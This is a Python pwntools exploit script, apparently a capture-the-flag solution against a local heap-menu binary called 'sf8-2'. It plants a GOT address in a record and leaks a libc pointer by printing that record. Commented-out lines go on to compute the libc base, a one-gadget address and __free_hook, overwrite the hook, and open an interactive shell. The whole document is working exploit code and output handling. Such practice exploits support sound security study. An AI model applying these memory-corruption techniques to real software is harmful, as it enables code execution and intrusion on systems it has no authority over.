from pwn import *

p = process("./sf8-2")
e = ELF("./sf8-2")

# context.log_level = 'debug'


def create(name, kind, age):
    p.recvuntil("> ")
    p.sendline("1")
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", age)
    
def edit(index, name, kind, age, y_n):
    p.recvuntil("> ")
    p.sendline("2")
    p.sendafter("> ", str(index))
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", str(age))
    p.sendafter("> ", y_n)
    
def print_one(index):
    p.recvuntil(">")
    p.sendline("3")
    p.sendafter("> ", str(index))

def print_all():
    p.recvuntil("> ")
    p.sendline("4")

def delete(index):
    p.recvuntil("> ")
    p.sendline("5")
    p.sendafter("> ", str(index))
    
    
create("AAAA", "BBBB", "10")
edit(0, "CCCC", "DDDD", "10", "n")
create("EEEE", p64(0x602068), "11")
# p64(0x602068)
# input()
# edit(0, p64(0x400730 + 6), "FFFF", "12", "y")

print_one(1)

p.recvuntil("kind: ")
leak = u64(p.recv(6).ljust(8, b'\x00'))

print(hex(leak))


input()

# # input()

# print_one(0)
# p.recvuntil("name: ")
# leak = p.recvline()[:-1] + b'\x00\x00'
# leak = u64(leak)

# libc_base = leak - 0x35a960
# one = libc_base + 0x45226
# free_hook = libc_base + 0x3c67a8

# print(hex(leak))

# edit(0, "GGGG", "HHHH", "13", "n")
# create("IIII", p64(free_hook + 6), "14")

# input()
# edit(0, p64(one), "JJJJ", "15", "y")

# input()
# # input()

p.interactive()